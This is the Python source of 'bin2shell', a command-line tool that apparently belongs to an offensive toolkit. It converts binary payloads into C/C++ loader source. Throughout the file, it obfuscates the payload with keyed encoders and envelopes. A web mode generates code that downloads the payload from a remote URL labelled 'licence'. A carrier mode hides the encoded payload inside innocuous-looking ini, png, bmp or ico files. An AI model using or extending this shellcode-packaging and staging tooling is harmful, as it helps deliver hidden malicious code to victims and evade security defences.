from __future__ import annotations

import argparse
import hashlib
import os
import sys
import textwrap
from dataclasses import dataclass
from typing import Any, Dict, Iterable, List, Optional, Set

try:
    import yaml  # PyYAML
except ImportError:
    sys.stderr.write("Error: PyYAML is required. Install with: pip install pyyaml\n")
    raise

from .carriers import (
    Carrier,
    get_carrier,
    list_carriers,
    render_carrier_cpp,
)
from .playbook import Playbook, validate_user_key
from .formatting import make_c_array, make_c_bstring, make_len_var, safe_format_cpp
from .utils import get_terminal_width, read_file


DEFAULT_YAML_REL = os.path.join("data", "yaml", "algos.yaml")
PLACEHOLDER_TOKEN = "__PAYLOAD_PLACEHOLDER__"
CARRIER_PAYLOAD_VAR = "__carrier_payload"


def _web_fetch_helper_block(playbook: "Playbook", web_helper_idx: int) -> str:
    spec = playbook.web_helpers.get(web_helper_idx)
    if not spec:
        raise CLIError(f"Web helper index {web_helper_idx} not found in playbook")
    name = spec.get("name", "unknown")
    parts = [
        f"// --- web helper: {name} ---\n",
        spec["cpp_includes"].rstrip() + "\n\n",
        spec["cpp_fetch_bytes"].rstrip() + "\n\n",
        spec["cpp_fetch_text"].rstrip() + "\n",
    ]
    return "\n".join(parts)

def _normalize_newlines(value: str) -> str:
    return value.replace("\r\n", "\n").replace("\r", "\n")


def _block_scalar(name: str, value: str) -> str:
    normalized = _normalize_newlines(value)
    has_trailing_newline = normalized.endswith("\n")
    content = normalized.rstrip("\n")
    chomp = "|" if has_trailing_newline else "|-"
    lines = content.split("\n") if content else []
    block = [f"{name}: {chomp}"]
    if not lines:
        block.append("  ")
    else:
        block.extend(f"  {line}" for line in lines)
    return "\n".join(block)


class CLIError(Exception):
    """Raised for controlled CLI failures."""


@dataclass
class Section:
    kind: str
    meta: Dict[str, Any]


@dataclass
class CLIArgs:
    input_path: str
    yaml_override: Optional[str]
    encoder_index: Optional[int]
    envelope_index: Optional[int]
    web_mode: bool
    web_helper_index: Optional[int] = None
    output_path: Optional[str] = None
    carrier: Optional[str] = None
    carrier_out: Optional[str] = None
    carrier_runtime_path: Optional[str] = None
    key: Optional[str] = None


@dataclass
class GenerationContext:
    sections: List[Section]
    payload_bytes: Optional[bytes]
    payload_text: Optional[str]
    options_meta: Dict[str, Any]
    playbook: Optional["Playbook"] = None
    web_helper_index: int = 0


def _make_web_payload_array(name: str, expected_len: int) -> str:
    return (
        f"// Expected payload length: {expected_len} bytes\n"
        f"// Update the URL to your HTTP(S) endpoint.\n"
        f"static const std::string {name}_payload_url = \"http://localhost/licence\";\n"
        f"static std::vector<unsigned char> {name}_storage = bin2shell_fetch_payload_from_url({name}_payload_url);\n"
        f"unsigned char* {name} = {name}_storage.empty() ? nullptr : {name}_storage.data();\n"
    )


def _make_web_payload_string(name: str, expected_len: int) -> str:
    return (
        f"// Expected payload length: {expected_len} characters\n"
        f"// Update the URL to your HTTP(S) endpoint.\n"
        f"static const std::string {name}_payload_url = \"http://localhost/licence\";\n"
        f"static std::string {name}_storage = bin2shell_fetch_payload_text({name}_payload_url);\n"
        f"const char* {name} = {name}_storage.c_str();\n"
    )


def _make_web_len_block(name: str, value: int, payload_name: str, literal: bool) -> str:
    storage = f"{payload_name}_storage"
    if literal:
        expected_name = f"{name}_expected"
        var_line = f"unsigned int {name} = static_cast<unsigned int>({storage}.size());\n"
        compare_target = name
    else:
        expected_name = f"{name}_expected_len"
        var_line = f"unsigned int {name}_len = static_cast<unsigned int>({storage}.size());\n"
        compare_target = f"{name}_len"
    return (
        f"static const unsigned int {expected_name} = {value};\n"
        f"{var_line}"
        f"[[maybe_unused]] static const bool {compare_target}_check = []() {{\n"
        f"    if ({compare_target} != {expected_name}) {{\n"
        f"        throw std::runtime_error(\"Fetched payload length mismatch for {payload_name}\");\n"
        f"    }}\n"
        f"    return true;\n"
        f"}}();\n"
    )


def _indent_block(text: str, indent: str) -> str:
    if not text:
        return ""
    lines = text.splitlines(True)
    return "".join(indent + line for line in lines)


def _raw_wrapper_start() -> str:
    return (
        "\nstruct Bin2ShellPayload {\n"
        "    unsigned char* code_blob;\n"
        "    unsigned int code_blob_len;\n"
        "};\n\n"
        "static Bin2ShellPayload bin2shell_payload = []() {\n"
    )


def _raw_wrapper_end() -> str:
    return (
        "\n    return Bin2ShellPayload{code_blob, code_blob_len};\n"
        "}();\n\n"
        "unsigned char* code_blob = bin2shell_payload.code_blob;\n"
        "unsigned int code_blob_len = bin2shell_payload.code_blob_len;\n"
    )


def _render_sections(
    sections: Iterable[Section],
    web_mode: bool,
    term_width: int,
    placeholder: str,
    playbook: Optional["Playbook"] = None,
    web_helper_idx: int = 0,
) -> str:
    chunks: List[str] = []
    web_payload_arrays: Set[str] = set()
    web_payload_strings: Set[str] = set()
    helpers_injected = False
    raw_open = False
    for section in sections:
        meta = section.meta
        if section.kind == "array":
            if raw_open:
                chunks.append(_raw_wrapper_end())
                raw_open = False
            chunks.append(make_c_array(meta["name"], meta["data"], term_width))
        elif section.kind == "payload_array":
            if raw_open:
                chunks.append(_raw_wrapper_end())
                raw_open = False
            if web_mode:
                if not helpers_injected:
                    if playbook and playbook.web_helpers:
                        chunks.append(_web_fetch_helper_block(playbook, web_helper_idx))
                    else:
                        raise CLIError("Web mode requires web_helpers in YAML playbook")
                    helpers_injected = True
                name = meta["name"]
                expected_len = len(meta.get("data", b""))
                web_payload_arrays.add(name)
                chunks.append(_make_web_payload_array(name, expected_len))
            else:
                chunks.append(make_c_array(meta["name"], meta["data"], term_width))
        elif section.kind == "string":
            if raw_open:
                chunks.append(_raw_wrapper_end())
                raw_open = False
            chunks.append(make_c_bstring(meta["name"], meta["text"], term_width))
        elif section.kind == "payload_string":
            if raw_open:
                chunks.append(_raw_wrapper_end())
                raw_open = False
            if web_mode:
                if not helpers_injected:
                    if playbook and playbook.web_helpers:
                        chunks.append(_web_fetch_helper_block(playbook, web_helper_idx))
                    else:
                        raise CLIError("Web mode requires web_helpers in YAML playbook")
                    helpers_injected = True
                name = meta["name"]
                expected_len = len(meta.get("text", ""))
                web_payload_strings.add(name)
                chunks.append(_make_web_payload_string(name, expected_len))
            else:
                chunks.append(make_c_bstring(meta["name"], meta["text"], term_width))
        elif section.kind == "len_var":
            if raw_open:
                chunks.append(_raw_wrapper_end())
                raw_open = False
            name = meta["name"]
            value = meta["value"]
            payload_name = meta.get("payload_name", name)
            if web_mode and name in web_payload_strings:
                chunks.append(_make_web_len_block(name, value, name, literal=False))
            elif web_mode and name in web_payload_arrays:
                chunks.append(_make_web_len_block(name, value, name, literal=False))
            elif web_mode and payload_name in web_payload_arrays:
                chunks.append(_make_web_len_block(name, value, payload_name, literal=False))
            elif web_mode and payload_name in web_payload_strings:
                chunks.append(_make_web_len_block(name, value, payload_name, literal=False))
            else:
                chunks.append(make_len_var(name, meta["value"]))
        elif section.kind == "len_literal":
            if raw_open:
                chunks.append(_raw_wrapper_end())
                raw_open = False
            payload_name = meta.get("payload_name")
            if web_mode and payload_name in web_payload_arrays:
                chunks.append(_make_web_len_block(meta["name"], meta["value"], payload_name, literal=True))
            else:
                chunks.append(f"unsigned int {meta['name']} = {meta['value']};\n")
        elif section.kind == "raw":
            if not raw_open:
                chunks.append(_raw_wrapper_start())
                raw_open = True
            chunks.append(_indent_block(meta.get("text", ""), "    "))
        elif section.kind == "carrier_includes":
            if raw_open:
                chunks.append(_raw_wrapper_end())
                raw_open = False
            chunks.append(meta.get("text", ""))
        elif section.kind == "carrier_load":
            # Emits the file-read + unwrap C++ from carriers.py, then
            # rebinds the result vector into the names the downstream
            # envelope/encoder snippets expect.
            if not raw_open:
                chunks.append(_raw_wrapper_start())
                raw_open = True
            chunks.append(_indent_block(meta.get("text", ""), "    "))
            target = meta.get("target", "code_blob_text")
            if target == "enc_buf":
                chunks.append(
                    f"    unsigned char* enc_buf = {CARRIER_PAYLOAD_VAR}.data();\n"
                    f"    unsigned int enc_len = (unsigned int){CARRIER_PAYLOAD_VAR}.size();\n"
                )
            else:
                chunks.append(
                    f"    const char* code_blob_text = (const char*){CARRIER_PAYLOAD_VAR}.data();\n"
                    f"    unsigned int code_blob_text_len = (unsigned int){CARRIER_PAYLOAD_VAR}.size();\n"
                )
        else:
            raise CLIError(f"Unsupported section type '{section.kind}'")
    if raw_open:
        chunks.append(_raw_wrapper_end())
    return "".join(chunks)


def _resolve_yaml_path(provided: Optional[str]) -> str:
    if provided:
        return provided
    candidate = os.path.join(os.getcwd(), DEFAULT_YAML_REL)
    if os.path.isfile(candidate):
        return candidate
    here = os.path.dirname(os.path.abspath(__file__))
    return os.path.abspath(os.path.join(here, os.pardir, DEFAULT_YAML_REL))


def _playbook_epilog(yaml_path: str) -> str:
    lines: List[str] = []
    try:
        if os.path.isfile(yaml_path):
            with open(yaml_path, "r", encoding="utf-8") as fh:
                cat = Playbook(yaml.safe_load(fh))
            lines.append("available encoders:")
            for spec in cat.list_block("encoders"):
                idx = spec.get("index", "?")
                name = spec.get("name", "")
                desc = spec.get("desc", "")
                lines.append(f"  [{idx}] {name}" + (f"  {desc}" if desc else ""))
            lines.append("")
            lines.append("available envelopes:")
            for spec in cat.list_block("envelopes"):
                idx = spec.get("index", "?")
                name = spec.get("name", "")
                desc = spec.get("desc", "")
                lines.append(f"  [{idx}] {name}" + (f"  {desc}" if desc else ""))
            if cat.web_helpers:
                lines.append("")
                lines.append("available web helpers:")
                for spec in cat.list_block("web_helpers"):
                    idx = spec.get("index", "?")
                    name = spec.get("name", "")
                    desc = spec.get("desc", "")
                    lines.append(f"  [{idx}] {name}" + (f"  {desc}" if desc else ""))
            lines.append("")
            lines.append("available carriers (--carrier):")
            for cspec in list_carriers():
                lines.append(
                    f"  [{cspec['index']}] {cspec['name']}  (.{cspec['extension']})  {cspec['desc']}"
                )
            lines.append("")
            lines.append(f"defaults: encoder={cat.default_index('encoders')}, envelope={cat.default_index('envelopes')}")
    except Exception:
        lines.append(f"(could not load playbook from {yaml_path})")
    return "\n".join(lines)


def _build_parser(yaml_path: str) -> argparse.ArgumentParser:
    # bin2shell mirrors the Washmachine CLI's three-form convention so a
    # caller can pick whichever style matches their shell habits:
    #   short:       -e 2
    #   PowerShell:  -Encoder 2     (PascalCase, single dash)
    #   POSIX long:  --encoder 2    (kebab-case, double dash)
    # All three are aliases for the same destination; they're documented
    # together in the help text.
    epilog = _playbook_epilog(yaml_path)
    parser = argparse.ArgumentParser(
        prog="bin2shell",
        description="Convert binary files to C/C++ source that reconstructs the original bytes at runtime.",
        epilog=epilog,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        # add_help=False so we can publish a tri-form -h / -Help / --help.
        add_help=False,
    )

    # INPUT may be given either positionally (legacy) or via -Input/--input
    # for parity with the Washmachine CLI's -Shellcode style. _parse_args
    # reconciles the two and errors if neither was supplied.
    parser.add_argument("INPUT", nargs="?", default=None,
                        help="path to the input binary file (or use -Input/--input)")
    parser.add_argument("-Input", "--input", dest="input_flag", default=None, metavar="PATH",
                        help="path to the input binary file (named alternative to the positional INPUT)")

    parser.add_argument("-e", "-Encoder", "--encoder", dest="encoder",
                        type=int, default=None, metavar="N",
                        help="encoder index (see list below)")
    parser.add_argument("-v", "-Envelope", "--envelope", dest="envelope",
                        type=int, default=None, metavar="N",
                        help="envelope index (see list below)")
    parser.add_argument("-y", "-Yaml", "--yaml", dest="yaml", default=None, metavar="PATH",
                        help=f"path to algorithms YAML (default: {DEFAULT_YAML_REL})")
    parser.add_argument("-w", "-Web", "--web", dest="web", action="store_true",
                        help="emit YAML bundle with web-fetch C++ template")
    parser.add_argument("-wh", "-WebHelper", "--web-helper", dest="web_helper",
                        type=int, default=None, metavar="N",
                        help="web helper index for HTTP fetch implementation (see list below)")
    parser.add_argument("-c", "-Carrier", "--carrier", dest="carrier", default=None, metavar="NAME|N",
                        help="wrap the encoded payload in an external file (ini, png, bmp, ico — see list below)")
    parser.add_argument("-k", "-Key", "--key", dest="key", default=None, metavar="KEY",
                        help="key string for keyed encoders (1-64 characters); "
                             "if omitted a random key is generated")
    parser.add_argument("-CarrierOut", "--carrier-out", dest="carrier_out", default=None, metavar="FILE",
                        help="write the wrapped carrier file to FILE "
                             "(default: <output>.<carrier-ext> or payload.<ext> when stdout)")
    parser.add_argument("-CarrierRuntimePath", "--carrier-runtime-path",
                        dest="carrier_runtime_path", default=None, metavar="EXPR",
                        help="C++ expression evaluating to the runtime carrier path "
                             '(default: basename of --carrier-out as a string literal)')
    parser.add_argument("-o", "-Output", "--output", dest="output", default=None, metavar="FILE",
                        help="write output to FILE instead of stdout")

    # Tri-form help, since we disabled argparse's auto-generated -h.
    parser.add_argument("-h", "-Help", "--help", action="help",
                        help="show this help message and exit")
    return parser


def _parse_args(argv: List[str]) -> CLIArgs:
    # Look ahead for the YAML path so the help epilog can list the playbook
    # entries from the file the caller actually intends to use. Accept every
    # alias form here too, otherwise -Yaml/--yaml wouldn't influence the
    # epilog.
    yaml_hint = None
    yaml_aliases = {"-y", "-Yaml", "--yaml"}
    for i, tok in enumerate(argv[1:], 1):
        if tok in yaml_aliases and i + 1 < len(argv):
            yaml_hint = argv[i + 1]
            break
    yaml_path = _resolve_yaml_path(yaml_hint)
    parser = _build_parser(yaml_path)
    ns = parser.parse_args(argv[1:])

    # Either the positional INPUT or the -Input/--input flag must be present.
    input_path = ns.input_flag or ns.INPUT
    if not input_path:
        parser.error(
            "INPUT file is required: pass it as a positional argument or via -Input/--input."
        )

    return CLIArgs(
        input_path=input_path,
        yaml_override=ns.yaml,
        encoder_index=ns.encoder,
        envelope_index=ns.envelope,
        web_mode=ns.web,
        web_helper_index=ns.web_helper,
        output_path=ns.output,
        carrier=ns.carrier,
        carrier_out=ns.carrier_out,
        carrier_runtime_path=ns.carrier_runtime_path,
        key=ns.key,
    )


def _load_binary(path: str) -> bytes:
    try:
        return read_file(path)
    except OSError as exc:
        raise CLIError(f"Error: Could not open file {path}: {exc}")


def _load_playbook(yaml_path: str) -> Playbook:
    try:
        with open(yaml_path, "r", encoding="utf-8") as handle:
            return Playbook(yaml.safe_load(handle))
    except Exception as exc:
        raise CLIError(f"Error: failed to load/validate YAML: {exc}")


def _build_simple_context(data: bytes) -> GenerationContext:
    sections = [
        Section("payload_array", {"name": "code_blob", "data": data}),
        Section("len_var", {"name": "code_blob", "value": len(data), "payload_name": "code_blob"}),
    ]
    options_meta = {
        "encoder": {"index": None, "name": "passthrough"},
        "envelope": {"index": None, "name": "bare_bytes"},
    }
    return GenerationContext(sections, payload_bytes=data, payload_text=None, options_meta=options_meta)


def _build_playbook_context(
    args: CLIArgs,
    data: bytes,
    playbook: Playbook,
    yaml_path: str,
) -> GenerationContext:
    sections: List[Section] = []

    enc_idx = args.encoder_index if args.encoder_index is not None else playbook.default_index("encoders")
    env_idx = args.envelope_index if args.envelope_index is not None else playbook.default_index("envelopes")

    try:
        enc_bytes, keys_dict, _enc_emit, enc_spec = playbook.run_encode(enc_idx, data, user_key=args.key)
    except Exception as exc:
        raise CLIError(f"Encode error (index {enc_idx}): {exc}")

    env_spec = playbook.envelopes.get(env_idx)
    if not env_spec:
        raise CLIError(f"Envelope error (index {env_idx}): not found in playbook")

    envelope_name = str(env_spec.get("name", "")).lower()
    payload_bytes: Optional[bytes]
    payload_text: Optional[str] = None

    for key_name, key_bytes in keys_dict.items():
        sections.append(Section("array", {"name": key_name, "data": key_bytes}))
        sections.append(Section("len_var", {"name": key_name, "value": len(key_bytes)}))

    sections.append(Section("len_var", {"name": "code_blob_expected", "value": len(data)}))

    if envelope_name in ("none", "bare_bytes"):
        sections.append(Section("payload_array", {"name": "enc_buf", "data": enc_bytes}))
        sections.append(
            Section(
                "len_literal",
                {
                    "name": "enc_len",
                    "value": len(enc_bytes),
                    "payload_name": "enc_buf",
                },
            )
        )
        payload_bytes = enc_bytes
    else:
        try:
            envelope_text, _env_emit, env_spec = playbook.run_envelope(env_idx, enc_bytes)
        except Exception as exc:
            raise CLIError(f"Envelope error (index {env_idx}): {exc}")
        sections.append(Section("payload_string", {"name": "code_blob_text", "text": envelope_text}))
        sections.append(
            Section(
                "len_var",
                {
                    "name": "code_blob_text",
                    "value": len(envelope_text),
                    "payload_name": "code_blob_text",
                },
            )
        )
        sections.append(Section("raw", {"text": "\n// ---- inline envelope decode ----\n"}))
        env_cpp = env_spec["cpp_decode"]
        sections.append(Section("raw", {"text": safe_format_cpp(env_cpp, {})}))
        payload_bytes = envelope_text.encode("utf-8")
        payload_text = envelope_text

    enc_name = str(enc_spec.get("name", "")).lower()
    inverse_cpp = enc_spec["cpp_inverse"]
    context_map: Dict[str, str] = {}
    for key_name in keys_dict:
        context_map[key_name] = key_name
        context_map[f"{key_name}_len"] = f"{key_name}_len"

    comment = (
        "// ---- no encoding: enc_buf becomes code_blob ----"
        if enc_name in ("none", "passthrough")
        else "// ---- inline inverse encoding ----"
    )
    sections.append(Section("raw", {"text": "\n" + comment + "\n"}))
    try:
        sections.append(Section("raw", {"text": safe_format_cpp(inverse_cpp, context_map)}))
    except KeyError as exc:
        raise CLIError(f"Error: Missing placeholder for encoder inverse C++: {exc}")

    # After all decoding, assign enc_buf/enc_len to code_blob/code_blob_len
    sections.append(Section("raw", {"text": "\n// Assign the decoded buffer to code_blob\n"}))
    sections.append(Section("raw", {"text": "unsigned char* code_blob = enc_buf;\n"}))
    sections.append(Section("raw", {"text": "unsigned int code_blob_len = enc_len;\n"}))

    options_meta: Dict[str, Any] = {
        "encoder": {"index": enc_spec.get("index"), "name": enc_spec.get("name")},
        "envelope": {"index": env_spec.get("index"), "name": env_spec.get("name")},
        "yaml_path": yaml_path,
    }

    return GenerationContext(sections, payload_bytes=payload_bytes, payload_text=payload_text, options_meta=options_meta)


def _format_payload_bytes(payload: bytes, group: int = 16) -> str:
    hex_chunks = [f"0x{byte:02X}" for byte in payload]
    lines = [" ".join(hex_chunks[i : i + group]) for i in range(0, len(hex_chunks), group)]
    return "\n".join(lines)


def _emit_web(context: GenerationContext, term_width: int) -> None:
    if context.payload_bytes is None:
        raise CLIError("Error: payload unavailable for web output")
    playbook = context.playbook
    if not playbook or not playbook.web_helpers:
        raise CLIError("Web mode requires web_helpers in YAML playbook")

    wh_spec = playbook.web_helpers.get(context.web_helper_index)
    if not wh_spec:
        raise CLIError(f"Web helper index {context.web_helper_index} not found")

    # --- cpp_includes ---
    cpp_includes = wh_spec["cpp_includes"].rstrip() + "\n"

    # --- cpp_declarations: keys + length vars (before payload/raw sections) ---
    decl_chunks: List[str] = []
    for sec in context.sections:
        if sec.kind in ("payload_array", "payload_string", "raw"):
            break
        m = sec.meta
        if sec.kind == "array":
            decl_chunks.append(make_c_array(m["name"], m["data"], term_width))
        elif sec.kind == "len_var":
            decl_chunks.append(make_len_var(m["name"], m["value"]))
        elif sec.kind == "len_literal":
            decl_chunks.append(f"unsigned int {m['name']} = {m['value']};\n")
    cpp_declarations = "".join(decl_chunks).rstrip() + "\n" if decl_chunks else ""

    # --- cpp_web_fetch ---
    cpp_web_fetch = (
        wh_spec["cpp_fetch_bytes"].rstrip() + "\n\n" +
        wh_spec["cpp_fetch_text"].rstrip() + "\n"
    )

    # --- cpp_payload_init: URL fetch + length check ---
    init_chunks: List[str] = []
    payload_seen = False
    for sec in context.sections:
        m = sec.meta
        if sec.kind in ("payload_array", "payload_string"):
            payload_seen = True
            name = m["name"]
            if sec.kind == "payload_array":
                expected_len = len(m.get("data", b""))
                init_chunks.append(_make_web_payload_array(name, expected_len))
            else:
                expected_len = len(m.get("text", ""))
                init_chunks.append(_make_web_payload_string(name, expected_len))
        elif payload_seen and sec.kind in ("len_var", "len_literal") and sec.kind != "raw":
            name = m["name"]
            value = m["value"]
            payload_name = m.get("payload_name", name)
            if sec.kind == "len_literal":
                init_chunks.append(_make_web_len_block(name, value, payload_name, literal=True))
            else:
                init_chunks.append(_make_web_len_block(name, value, payload_name, literal=False))
        elif sec.kind == "raw":
            break
    cpp_payload_init = "".join(init_chunks).rstrip() + "\n" if init_chunks else ""

    # --- cpp_decode: envelope decode + encoder inverse (raw sections) ---
    # Wrapped in a lambda that produces code_blob / code_blob_len at file scope.
    decode_chunks: List[str] = []
    for sec in context.sections:
        if sec.kind == "raw":
            decode_chunks.append(sec.meta.get("text", ""))
    if decode_chunks:
        raw_body = "".join(decode_chunks)
        indented = _indent_block(raw_body, "    ")
        cpp_decode = (
            "struct Bin2ShellPayload {\n"
            "    unsigned char* code_blob;\n"
            "    unsigned int code_blob_len;\n"
            "};\n\n"
            "static Bin2ShellPayload bin2shell_payload = []() {\n"
            + indented +
            "\n    return Bin2ShellPayload{code_blob, code_blob_len};\n"
            "}();\n\n"
            "unsigned char* code_blob = bin2shell_payload.code_blob;\n"
            "unsigned int code_blob_len = bin2shell_payload.code_blob_len;\n"
        )
    else:
        cpp_decode = ""

    # --- payload + options ---
    payload_value = context.payload_text if context.payload_text is not None else _format_payload_bytes(context.payload_bytes)
    checksum_value = hashlib.sha256(context.payload_bytes).hexdigest()

    wh_info = {"index": wh_spec.get("index"), "name": wh_spec.get("name")}
    options = {**context.options_meta, "web": True, "web_helper": wh_info}
    options["payload_len"] = len(context.payload_bytes)
    options["payload_checksum"] = {"algorithm": "sha256", "value": checksum_value}

    options_yaml = yaml.safe_dump(
        {"options": options}, sort_keys=False, default_flow_style=False,
    ).rstrip()

    parts = [
        _block_scalar("cpp_includes", cpp_includes),
    ]
    if cpp_declarations:
        parts.append(_block_scalar("cpp_declarations", cpp_declarations))
    parts.extend([
        _block_scalar("cpp_web_fetch", cpp_web_fetch),
        _block_scalar("cpp_payload_init", cpp_payload_init),
    ])
    if cpp_decode:
        parts.append(_block_scalar("cpp_decode", cpp_decode))
    parts.extend([
        _block_scalar("payload", payload_value),
        options_yaml,
    ])

    sys.stdout.write("\n".join(parts) + "\n")


def _emit_native(context: GenerationContext, term_width: int) -> None:
    code_output = _normalize_newlines(
        _render_sections(context.sections, False, term_width, PLACEHOLDER_TOKEN,
                         playbook=context.playbook, web_helper_idx=context.web_helper_index)
    )
    sys.stdout.write(code_output)


def _apply_carrier(
    context: GenerationContext,
    args: CLIArgs,
    payload_bytes_for_carrier: bytes,
    envelope_name: str,
) -> tuple[str, bytes]:
    """Wrap the encoded payload in a carrier file, mutate the section list
    so the runtime C++ loads from that file instead of an inline literal,
    and return (carrier_output_path, carrier_file_bytes).

    Only the payload-bearing sections (``payload_array`` / ``payload_string``
    and their matching length sections) are replaced. Key arrays, length
    constants, and inverse C++ snippets stay in place so the rest of the
    pipeline is unaware that the payload now lives on disk.
    """
    carrier = get_carrier(args.carrier)
    carrier_bytes = carrier.wrap(payload_bytes_for_carrier)

    # Where to save the wrapped file on the build host.
    if args.carrier_out:
        carrier_out_path = args.carrier_out
    elif args.output_path:
        base = os.path.splitext(args.output_path)[0]
        carrier_out_path = f"{base}.{carrier.extension}"
    else:
        carrier_out_path = f"payload.{carrier.extension}"

    os.makedirs(os.path.dirname(os.path.abspath(carrier_out_path)) or ".", exist_ok=True)
    with open(carrier_out_path, "wb") as fh:
        fh.write(carrier_bytes)

    runtime_path_expr = args.carrier_runtime_path or f'"{os.path.basename(carrier_out_path)}"'
    target_var = "enc_buf" if envelope_name in ("none", "bare_bytes") else "code_blob_text"

    # Filter out inline payload sections; carrier replaces them.
    drop_names = {"code_blob_text", "enc_buf"}
    kept: List[Section] = []
    for sec in context.sections:
        if sec.kind in ("payload_array", "payload_string") and sec.meta.get("name") in drop_names:
            continue
        if sec.kind in ("len_var", "len_literal") and sec.meta.get("payload_name") in drop_names:
            continue
        kept.append(sec)

    carrier_load_text = render_carrier_cpp(
        carrier,
        carrier_out_var=CARRIER_PAYLOAD_VAR,
        carrier_path_expr=runtime_path_expr,
    )

    # Insert carrier sections at the point where the payload used to live —
    # i.e. just before the first raw-decode section.
    insert_at = next(
        (i for i, s in enumerate(kept) if s.kind == "raw"),
        len(kept),
    )
    kept.insert(insert_at, Section("carrier_includes", {"text": carrier.cpp_includes}))
    kept.insert(insert_at + 1, Section(
        "carrier_load",
        {
            "text": carrier_load_text,
            "target": target_var,
        },
    ))
    context.sections = kept
    return carrier_out_path, carrier_bytes


def main(argv: List[str]) -> int:
    # Force UTF-8 on stdout; the legacy cp1252 default on Windows blows up
    # the moment a generated source includes a non-ASCII comment or string.
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

    try:
        args = _parse_args(argv)
        try:
            validate_user_key(args.key)
        except ValueError as exc:
            raise CLIError(f"Error: invalid key: {exc}")
        data = _load_binary(args.input_path)
        term_width = max(40, get_terminal_width())

        needs_playbook = (
            args.yaml_override is not None
            or args.encoder_index is not None
            or args.envelope_index is not None
            or args.web_mode
            or args.carrier is not None
        )
        if not needs_playbook:
            context = _build_simple_context(data)
        else:
            yaml_path = _resolve_yaml_path(args.yaml_override)
            if not os.path.isfile(yaml_path):
                raise CLIError(
                    f"Error: YAML not found. Expected at '{yaml_path}'. Pass with -y if different."
                )
            playbook = _load_playbook(yaml_path)
            web_helper_idx = args.web_helper_index if args.web_helper_index is not None else playbook.default_index("web_helpers") if playbook.web_helpers else 0
            if args.encoder_index is None and args.envelope_index is None and not args.web_mode and args.carrier is None:
                context = _build_simple_context(data)
            else:
                context = _build_playbook_context(args, data, playbook, yaml_path)
            context.playbook = playbook
            context.web_helper_index = web_helper_idx

        if args.carrier is not None:
            if args.web_mode:
                raise CLIError("--carrier and --web are mutually exclusive (carrier loads from disk; web fetches over HTTP)")
            if context.payload_bytes is None and context.payload_text is None:
                raise CLIError("Carrier mode requires an encoder/envelope pipeline.")
            envelope_name = str(context.options_meta.get("envelope", {}).get("name", "bare_bytes")).lower()
            if envelope_name in ("none", "bare_bytes"):
                payload_for_carrier = context.payload_bytes or b""
            else:
                payload_for_carrier = (context.payload_text or "").encode("utf-8")
            carrier_path, carrier_bytes = _apply_carrier(context, args, payload_for_carrier, envelope_name)
            context.options_meta["carrier"] = {
                "name": args.carrier,
                "path": carrier_path,
                "bytes": len(carrier_bytes),
            }
            sys.stderr.write(
                f"Carrier '{args.carrier}' written to {carrier_path} ({len(carrier_bytes)} bytes)\n"
            )

        out_fd = None
        if args.output_path:
            out_fd = open(args.output_path, "w", encoding="utf-8")
            sys.stdout = out_fd

        try:
            if args.web_mode:
                _emit_web(context, term_width)
            else:
                _emit_native(context, term_width)
        finally:
            if out_fd:
                sys.stdout = sys.__stdout__
                out_fd.close()

        return 0
    except CLIError as exc:
        sys.stderr.write(f"{exc}\n")
        return 1

